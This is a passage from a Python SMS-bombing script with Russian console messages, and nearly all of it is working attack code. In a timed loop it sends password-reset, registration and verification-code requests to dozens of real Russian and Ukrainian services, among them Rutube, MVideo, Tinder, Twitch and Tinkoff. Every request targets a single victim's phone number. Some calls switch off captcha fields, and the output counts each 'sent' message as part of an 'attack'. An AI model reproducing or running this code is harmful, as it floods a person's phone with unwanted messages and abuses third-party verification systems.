            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Was sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
